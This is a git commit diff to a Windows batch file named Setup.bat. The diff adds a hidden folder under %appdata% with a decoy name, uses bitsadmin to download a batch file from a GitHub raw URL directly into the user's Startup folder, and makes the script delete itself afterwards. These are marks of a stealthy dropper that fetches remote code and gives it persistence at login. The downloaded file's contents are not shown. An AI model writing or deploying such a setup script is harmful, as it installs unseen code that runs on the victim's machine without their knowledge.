bc41ea9503d33acab9cd6e22730ce64a66f0581b
RandumPerson314 <46033255+RandumPerson314@users.noreply.github.com>
2021-04-02 01:02:55 -0400

    Update Setup.bat

--- Setup.bat
+++ Setup.bat
@@ -1,4 +1,7 @@
-md "%appdata%\Extra Data\bin\lib\assets\files\unused\script\32\64\mem\unzip\123\124\data"
-set downloadfolder="%appdata%\Extra Data\bin\lib\assets\files\unused\script\32\64\mem\unzip\123\124\data"
+md "%appdata%\Decoder Studio\assets\files\logs\cache\resources\versions\web\backup "
+set downloadfolder="%appdata%\Decoder Studio\assets\files\logs\cache\resources\versions\web\backup"
+set thestartupfolder="%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
 bitsadmin  /transfer mydownloadjob  /download  /priority foreground https://raw.githubusercontent.com/RandumPerson314/Files-to-host-online/master/video.mp4  %downloadfolder%\video.mp4
+bitsadmin  /transfer mydownloadjob  /download  /priority foreground https://raw.githubusercontent.com/RandumPerson314/Files-to-host-online/master/StartupExecutable.bat  %thestartupfolder%\StartupExecutable.bat
 pause
+del Setup.bat
